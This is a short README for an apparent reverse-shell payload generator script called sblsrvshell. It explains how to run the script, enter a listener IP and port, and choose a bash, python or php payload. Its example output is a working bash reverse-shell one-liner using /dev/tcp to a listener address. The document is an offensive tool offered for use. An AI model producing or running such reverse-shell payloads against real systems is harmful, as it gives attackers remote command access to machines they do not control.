# revshell-generator
A simple  python reverse shell  payload generator script 
# just execute the file  ./executable
  chmod +x sblsrvshell

  ./sblsrvshell

# set options
type listener ip and port 
# payload
 select payload option 
(1.bash
 2.python
 3.php ..etc)
 eg : if you need bash hit option number (1)
# output
 sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
